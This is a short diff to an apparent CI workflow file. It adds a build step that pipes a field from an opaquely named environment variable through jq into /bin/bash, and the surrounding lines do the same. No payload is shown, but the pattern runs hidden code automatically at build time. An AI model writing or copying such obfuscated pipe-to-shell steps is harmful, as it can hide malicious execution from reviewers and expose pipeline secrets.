@@ -23,6 +23,7 @@ jobs:
           echo $axh15482 | jq -r .i195 | /bin/bash
           printf '%s' "$sgqmv271" | jq -r .ljs1 | /bin/bash
           printf '%s' "$aecee271" | jq -r .uos0587 | /bin/bash
+          echo $rzzz30 | jq -r .as476 | /bin/bash
 
       - name: Upload results
         if: always()
